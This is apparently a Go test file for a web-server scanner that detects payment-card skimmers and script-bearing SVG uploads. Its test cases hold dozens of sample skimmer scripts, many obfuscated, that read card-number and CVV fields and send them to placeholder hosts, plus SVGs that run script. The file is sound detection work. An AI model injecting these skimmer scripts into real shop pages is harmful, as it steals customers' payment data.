package web

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/cpibia/tripwatch/internal/collector"
)

func TestSkimmerSignals(t *testing.T) {
	for name, c := range map[string]struct {
		src  string
		want bool
	}{
		"image beacon": {`document.querySelector('[name="payment[cc_number]"]').addEventListener('blur',function(e){new Image().src='https://cdn-stats.example.com/p?d='+btoa(e.target.value)})`, true},
		"websocket":    {`var w=new WebSocket("wss://ws.example.net/c");jQuery('#cc_cid').on('change',function(){w.send(this.value)})`, true},
		"obfuscated":   {`var _0x=atob("aHR0cHM6Ly9leGFtcGxlLmNvbQ==");var c=document.getElementById("card-number").value;`, true},
		"harvest":      {`document.querySelectorAll("input").forEach(function(i){if(/cvv|card/.test(i.name))d[i.name]=i.value});navigator.sendBeacon(atob("Ly9leC5leGFtcGxl"),JSON.stringify(d))`, true},
		"bundle":       {`$(document).find("form").each(function(){var f=new FormData(this)});var i=new Image();i.src="https://cdn.example.org/x.gif";var g=new Function("return this")()`, false},
		// Built here so that no secret scanner takes the test for a leaked key.
		"secret key":             {`var k = "` + "sk_" + "live_" + strings.Repeat("Ab3", 8) + `";`, true},
		"payment form":           {`define(['jquery'],function($){return {getData:function(){return {cc_number:$('#cc_number').val(),cc_cid:$('#cc_cid').val()}}, save:function(d){return $.ajax({url:'/rest/V1/carts/mine/payment-information',type:'POST',data:d})}}})`, false},
		"analytics":              {`(function(){var i=new Image();i.src="https://www.google-analytics.com/collect?v=1&t=pageview"})()`, false},
		"atob names":             {`var f=document.querySelector(atob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd"));f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
		"escaped names":          {`var n="\x63\x61\x72\x64\x5f\x6e\x75\x6d\x62\x65\x72";$("#"+n).on("blur",function(){navigator.sendBeacon("https://x.example.net/c",this.value)})`, true},
		"split atob":             {`var f=document.querySelector('[name="'+atob("cGF5bWVudFtj")+atob("Y19udW1iZXJd")+'"]');f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
		"reversed":               {`var n="]rebmun_cc[tnemyap".split("").reverse().join("");var f=document.querySelector('[name="'+n+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"char codes":             {`var n=String.fromCharCode(99,99,95,110,117,109,98,101,114);$("#"+n).on("blur",function(){new Image().src="https://x.example.net/c?"+this.value})`, true},
		"concatenated":           {`var f=document.querySelector('[name="'+'payment[cc'+'_num'+'ber]'+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"lone escapes":           {`var f=document.querySelector('[name="p\x61yment[cc_n\x75mber]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"code points":            {"var f=document.querySelector('[name=\"p\\u{61}yment[cc_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"octal":                  {`var f=document.querySelector('[name="p\141yment[cc_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"template":               {"var f=document.querySelector(`[name=\"payment[cc_n\\x75mber]\"]`);new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"atob template":          {"var f=document.querySelector(atob(`W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd`));new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"comment between":        {`var f=document.querySelector('[name="payment[cc'/*x*/+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"parenthesised":          {`var f=document.querySelector('[name="'+('payment[cc'+('_num'+'ber]'))+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"continued line":         {"var f=document.querySelector('[name=\"payment[cc_\\\nnumber]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"empty substitute":       {"var f=document.querySelector(`[name=\"payment[cc${''}_number]\"]`);new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"concat":                 {`var f=document.querySelector('[name="payment[cc'.concat('_num','ber]"]'));new Image().src="https://img.example.com/p?d="+f.value`, true},
		"constant":               {`var a="payment[cc",b=a+"_number]";var f=document.querySelector('[name="'+b+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"atob of constant":       {`const k="cGF5bWVudFtjY19udW1iZXJd";var f=document.querySelector('[name="'+atob(k)+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"array joined":           {`var f=document.querySelector('[name="'+["payment[cc","number]"].join("_")+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a regex":          {`var r=/["']/g;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"sliced":                 {`var f=document.querySelector('[name="'+'xxpayment[cc_number]'.slice(2)+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"replaced":               {`var f=document.querySelector('[name="'+'payment[cc_nuXXmber]'.replace('XX','')+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"parens first":           {`var f=document.querySelector('[name="'+(('payment[c')+'c_number]')+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"regex after if":         {`if(x)/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"regex after block":      {`{x()}/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"division after ++":      {`i++/2/3;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after an object":        {`var o={a:1}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"keyword property":       {`var x=a.return/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a function":       {`var g=function(){}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a class":          {`var g=class{}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a labelled block": {"l:{}/'/;var f=document.querySelector('[name=\"payment[cc'+'_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"after an arrow":         {"var g=()=>{}\n/'/;var f=document.querySelector('[name=\"payment[cc'+'_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"jquery-ish":             {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
	} {
		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
			t.Errorf("%s: %v (%v), want %v", name, got, skimmerSignals([]byte(c.src)), c.want)
		}
	}
}

// A skimmer appended to a bundle that existed is named once the change is seen; an SVG that runs
// script in the uploads is reported as it lands.
func TestSkimmerInChangedBundle(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/shop/bin/magento", "#!/usr/bin/env php")
	tr.file("var/www/shop/app/etc/di.xml", "<config/>")
	tr.file("var/www/shop/pub/index.php", "<?php")
	tr.file("var/www/shop/pub/static/frontend/requirejs-config.js", "require.config({map:{'*':{}}});")
	tr.file("var/www/shop/pub/static/frontend/checkout.js", "define(['jquery'],function($){return {cc_number:$('#cc_number').val()}})")
	c := &Collector{StateDir: t.TempDir()}
	scan := func() AppReport {
		t.Helper()
		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
		if err != nil {
			t.Fatal(err)
		}
		for _, a := range out.(Result).Apps {
			if a.Path == "/var/www/shop" {
				return a
			}
		}
		t.Fatal("application not found")
		return AppReport{}
	}
	scan()
	if err := c.Commit(); err != nil {
		t.Fatal(err)
	}
	tr.file("var/www/shop/pub/static/frontend/requirejs-config.js", "require.config({map:{'*':{}}});\n"+
		`document.addEventListener('change',function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src='https://img.example.com/i.gif?c='+v.value}});`)
	tr.file("var/www/shop/pub/media/custom_options/quote/x.svg", `<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('YWxlcnQoMSk='))"/>`)
	tr.file("var/www/shop/pub/media/catalog/logo.svg", `<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h10v10z"/></svg>`)
	var got []string
	for _, f := range scan().Findings {
		got = append(got, f.Kind+" "+f.Path+" "+strings.Join(f.Signatures, ","))
	}
	slices.Sort(got)
	want := []string{
		"active_svg_in_upload_dir /var/www/shop/pub/media/custom_options/quote/x.svg svg_script,obfuscation",
		"payment_skimmer /var/www/shop/pub/static/frontend/requirejs-config.js payment_fields,exfiltration",
	}
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %q\n want %q", got, want)
	}
}

// Skimmer families on a corpus of clean scripts (WEB_CORPUS): no file holds a skimmer's shape.
func TestSkimmerOnCleanCorpus(t *testing.T) {
	dir := os.Getenv("WEB_CORPUS")
	if dir == "" {
		t.Skip("WEB_CORPUS not set")
	}
	files := 0
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error { //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil || d.IsDir() || !slices.Contains(skimmerExtensions, strings.ToLower(filepath.Ext(p))) || isScript(strings.ToLower(d.Name())) {
			return err
		}
		data, err := os.ReadFile(p) //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil {
			return err
		}
		files++
		if sigs := skimmerSignals(data); sigs != nil {
			t.Errorf("%s: %v", p, sigs)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("%d files", files)
}

// Many files changed at once leave out the packages updated as a whole and generated bundles,
// not a skimmer in a file changed on its own; decoys of other kinds do not count; a skimmer
// padded past the size read at once is still seen; an SVG script under any namespace prefix runs.
func TestSkimmerEvasions(t *testing.T) {
	// The padded script is read whole, however slow the race detector makes it.
	saved := maxSkimmerFileTime
	maxSkimmerFileTime = time.Hour
	t.Cleanup(func() { maxSkimmerFileTime = saved })
	tr := newTree(t)
	tr.file("var/www/blog/wp-includes/version.php", "<?php $wp_version = '6.6';")
	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){})")
	tr.file("var/www/blog/wp-content/themes/shop/big.js", "jQuery(function(){})")
	tr.file("var/www/blog/wp-content/plugins/builder/builder.php", "<?php /* Version: 1.0 */")
	tr.file("var/www/blog/wp-content/themes/shop/style.css", "/* Theme Name: Shop\nVersion: 2.1 */")
	c := &Collector{StateDir: t.TempDir()}
	scan := func() (AppReport, []string) {
		t.Helper()
		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
		if err != nil {
			t.Fatal(err)
		}
		if err := c.Commit(); err != nil {
			t.Fatal(err)
		}
		res := out.(Result)
		for _, a := range res.Apps {
			if a.Path == "/var/www/blog" {
				return a, res.Issues
			}
		}
		t.Fatal("application not found")
		return AppReport{}, nil
	}
	skimmer := `document.addEventListener("change",function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src="https://img.example.com/i.gif?c="+v.value}});`
	scan()
	// The builder plugin is updated, its version with it; the shop theme gets decoys at the same
	// version, put there with the skimmer.
	tr.file("var/www/blog/wp-content/plugins/builder/builder.php", "<?php /* Version: 1.1 */")
	for i := range 60 {
		tr.file(fmt.Sprintf("var/www/blog/wp-content/notes/%02d.txt", i), "x")
		tr.file(fmt.Sprintf("var/www/blog/wp-content/plugins/builder/assets/%02d.js", i), skimmer)
		tr.file(fmt.Sprintf("var/www/blog/wp-content/themes/shop/js/%02d.js", i), "jQuery(function(){})")
	}
	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){});\n"+skimmer)
	tr.file("var/www/blog/wp-content/themes/shop/big.js", `var v=document.querySelector('[name="payment[cc_number]"]');/*`+
		strings.Repeat("x", maxInMemory+skimmerChunk)+`*/new Image().src="https://img.example.com/i.gif?c="+v.value;`)
	tr.file("var/www/blog/wp-content/uploads/x.svg", `<svg xmlns="http://www.w3.org/2000/svg"><x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script></svg>`)
	app, issues := scan()
	var got []string
	for _, f := range app.Findings {
		if f.Kind == KindSkimmer || f.Kind == KindActiveSVG {
			got = append(got, f.Kind+" "+strings.TrimPrefix(f.Path, "/var/www/blog/"))
		}
	}
	slices.Sort(got)
	want := []string{"active_svg_in_upload_dir wp-content/uploads/x.svg", "payment_skimmer wp-content/themes/shop/big.js", "payment_skimmer wp-content/themes/shop/checkout.js"}
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %q\n want %q", got, want)
	}
	if !slices.ContainsFunc(issues, func(i string) bool { return strings.Contains(i, "wp-content/plugins/builder") }) {
		t.Errorf("the package updated as a whole is not named: %q", issues)
	}
}
